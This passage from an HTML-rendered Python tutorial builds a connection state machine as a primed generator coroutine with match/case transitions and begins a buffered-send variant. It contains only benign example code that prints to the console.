class="token-line" style="color:#F8F8F2"><span class="token plain">    func</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> Callable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Generator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Callable</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Generator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Any</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@wraps</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">func</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">start</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">*</span><span class="token plain">args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        cr </span><span class="token operator">=</span><span class="token plain"> func</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token operator">*</span><span class="token plain">args</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token operator">**</span><span class="token plain">kwargs</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token builtin" style="color:rgb(189, 147, 249)">next</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">cr</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> cr</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">return</span><span class="token plain"> start</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ConnectionState </span><span class="token operator">=</span><span class="token plain"> Literal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ERROR"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ConnectionEvent </span><span class="token operator">=</span><span class="token plain"> Literal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_fail"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@primed_coroutine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">connection_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    state</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> ConnectionState </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        event</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> ConnectionEvent </span><span class="token operator">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> state</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"State: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">, Event: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">event</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">match</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">state</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> event</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_fail"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ERROR"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Connection failed, entering error state."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Exit the coroutine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Connection failed, entering error state."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">break</span><span class="token plain">  </span><span class="token comment" style="color:rgb(98, 114, 164)"># Exit the coroutine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"-&gt; Data sent successfully."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">            </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">case</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">_</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token comment" style="color:rgb(98, 114, 164)"># Default case for any unhandled state/event combination</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">                </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"-&gt; Cannot '</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">event</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">' from state '</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">'"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Starting Connection Test..."</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">handler </span><span class="token operator">=</span><span class="token plain"> connection_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># (The first .send(None) is handled by the decorator, so we start sending events)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"New state: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">current_state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"New state: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">current_state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"New state: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">current_state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">current_state </span><span class="token operator">=</span><span class="token plain"> handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">send</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">f"New state: </span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token string-interpolation interpolation">current_state</span><span class="token string-interpolation interpolation punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token string-interpolation string" style="color:rgb(255, 121, 198)">\n"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">close</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><br></span></code></pre></div></div>
<!-- -->
<p>This is a simple example that enforces permissibility of transitions, but doesn't really encapsulate any concerns from the caller yet.
However, now it is an easy ask to encapsulate a state-dependent behavior that the caller doesn't have reason to know about.
For example, this connection handler could buffer the "sent" data, and then truly dispatch the network request when either reaching a buffer size threshold or upon disconnect:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">from</span><span class="token plain"> textwrap </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">import</span><span class="token plain"> indent</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ConnectionState </span><span class="token operator">=</span><span class="token plain"> Literal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTING"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"CONNECTED"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"ERROR"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ConnectionEvent </span><span class="token operator">=</span><span class="token plain"> Literal</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token string" style="color:rgb(255, 121, 198)">"connect"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_success"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"connect_fail"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"send_data"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"disconnect"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:rgb(248, 248, 242)">@primed_coroutine</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">connection_handler</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    max_buffer_length</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">int</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token number">2</span><span class="token plain"> </span><span class="token operator">**</span><span class="token plain"> </span><span class="token number">10</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> Generator</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ConnectionState</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> Tuple</span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">ConnectionEvent</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">str</span><span class="token plain"> </span><span class="token operator">|</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    state </span><span class="token operator">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"DISCONNECTED"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token builtin" style="color:rgb(189, 147, 249)">buffer</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytearray</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">def</span><span class="token plain"> </span><span class="token function" style="color:rgb(80, 250, 123)">flush_buffer</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"> </span><span class="token builtin" style="color:rgb(189, 147, 249)">bytearray</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"> </span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token plain"> </span><span class="token boolean">None</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"Flushing buffer"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">print</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">indent</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">decode</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">"utf-8"</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">"... "</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        b</span><span class="token punctuation" style="color:rgb(248, 248, 242)">.</span><span class="token plain">clear</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">    </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">while</span><span class="token plain"> </span><span class="token boolean">True</span><span class="token punctuation" style="color:rgb(248, 248, 242)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">        event</span><span class="token punctuation" style="color:rgb(248, 248, 242)">,</span><span class="token plain"> data </span><span class="token operator">=</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">yield</span><span class="token plain"> state</span><br></span><span class="token-line" 